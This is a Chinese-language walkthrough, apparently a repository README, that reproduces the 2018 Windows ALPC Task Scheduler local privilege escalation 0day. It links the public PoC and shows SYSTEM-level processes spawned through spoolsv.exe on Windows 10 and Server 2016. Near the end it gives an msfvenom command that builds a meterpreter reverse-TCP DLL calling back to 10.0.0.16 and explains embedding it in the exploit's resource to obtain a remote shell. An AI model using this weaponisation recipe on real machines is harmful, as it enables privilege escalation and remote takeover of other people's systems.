# ALPC bug 0day

https://github.com/SandboxEscaper/randomrepo/blob/master/PoCLPE.rar

https://www.theregister.co.uk/2018/08/28/windows_0day_pops_up_out_of_span_classstrikenowherespan_twitter/

## 用法
@sandboxescaper8月28号在推特上发布了Windows的本地版权0day，然后被很快的撤回。PoC在Github上。然后我验证了一下是不是真的，确实如此。

- 以管理员身份打开Process Explorer - 右键单击​​“以管理员身份运行”


```
https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer
```
- 作为普通用户，启动记事本。如果从cmd打开它，则会在cmd中获得一个子进程。此进程使用启动它的用户上下文运行。

- PID是3872

![](https://raw.githubusercontent.com/evilwing/wing-images/master/img/20181115161058.png)

- 如果需要在Process Explorer中查看用户名和完整性级别，可以转到`查看` - >`选择列`并进行检查.

![](https://raw.githubusercontent.com/evilwing/wing-images/master/img/20181115161209.png)
现在，看一下spoolsv.exe进程。

![](https://raw.githubusercontent.com/evilwing/wing-images/master/img/20181115161500.png)


使用之前产生的`PID 3872`

![](https://raw.githubusercontent.com/evilwing/wing-images/master/img/20181115162827.png)

再次在Process Explorer中查看spoolsv
![](https://raw.githubusercontent.com/evilwing/wing-images/master/img/20181115162855.png)

Bham！conhost和notepad的子进程cmd.exe是SYSTEM权限！

## windows10运行成功

在Windows 10 1803上确认0day priv esc.MS尚未发布补丁（28.08.2018）


![](https://raw.githubusercontent.com/evilwing/wing-images/master/img/20181116152129.png)

可能会打开一个实际的system权限的cmd窗口

@plaintextg跟我在`session 0`中产生了进程，这就是为什么用户看不到会话1中的操作。如果在ProcExplorer的面板中切换Session，你可以非常清楚地看到：

![](https://raw.githubusercontent.com/evilwing/wing-images/master/img/20181116152335.png)
## Windows Server 2016 测试成功
![](https://raw.githubusercontent.com/evilwing/wing-images/master/img/20181116152411.png)

## windows7 测试失败
![](https://raw.githubusercontent.com/evilwing/wing-images/master/img/20181116152514.png)

## 自动化攻击？
阅读完源代码后，记事本是从添加的资源中启动的。这可以在源代码的101-105行看到。exploit.dll

```
//Payload is included as a resource, you need to modify this resource accordingly.
HRSRC myResource = ::FindResource(mod, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
unsigned int myResourceSize = ::SizeofResource(mod, myResource);
HGLOBAL myResourceData = ::LoadResource(mod, myResource);
void* pMyBinaryData = ::LockResource(myResourceData);
```

点击那个，我们可以看到这个exploit.dll在PoC中产生记事本无法读取，因为没有在绝对路径中。

![](https://raw.githubusercontent.com/evilwing/wing-images/master/img/20181116152634.png)

因此，我没有重新编译和修复visual studio的500个错误，而是决定使用[CFF Explorer ](https://ntcore.com/?page_id=388) 直接替换dll作为资源更容易。这样干之前，必须准备好payload。


```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.0.0.16 lport=444 -f dll -o lol.dll
```
在CFF Explorer中选择Replace Resource（raw）。然后将`lol.dllALPC-TaskSched-LPE.dll `另存为新文件。整个漏洞利用现已嵌入到dll文件中.

![](https://raw.githubusercontent.com/evilwing/wing-images/master/img/20181116153156.png)

所以我们再次触发漏洞，等shell弹回来。

getshell！

![](https://raw.githubusercontent.com/evilwing/wing-images/master/img/20181116153412.png)





